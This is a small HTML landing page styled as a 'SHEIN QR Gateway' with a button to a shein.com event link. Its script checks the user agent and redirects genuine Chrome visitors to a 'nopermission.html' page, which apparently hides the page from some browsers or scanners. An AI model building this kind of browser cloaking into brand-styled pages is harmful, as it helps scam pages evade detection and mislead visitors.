<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SHEIN Gateway Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 450px;
      width: 90%;
    }

    h1 {
      font-size: 1.4rem;
      color: #000;
      margin-bottom: 20px;
    }

    p {
      font-size: 1rem;
      color: #444;
      margin-bottom: 10px;
    }

    .btn {
      margin-top: 20px;
      display: inline-block;
      background-color: #000;
      color: #fff;
      padding: 12px 20px;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: bold;
      text-decoration: none;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #333;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>SHEIN QR Gateway</h1>
    <p>Welcome to your personalized access page.</p>
    <p>Click the button below to continue to the event.</p>
    <a class="btn" href="https://www.shein.com/event-link">Continue</a>
  </div>

  <script>
    function isRealChrome() {
      const ua = navigator.userAgent;
      const isChromium = ua.includes('Chrome');
      const isGoogle = navigator.vendor === 'Google Inc';
      const isOpera = ua.includes('OPR') || ua.includes('Opera');
      const isEdge = ua.includes('Edg');

      return isChromium && isGoogle && !isOpera && !isEdge;
    }

    if (isRealChrome()) {
      window.location.href = "nopermission.html"; // Block access if real Chrome
    }
  </script>
</body>
</html>
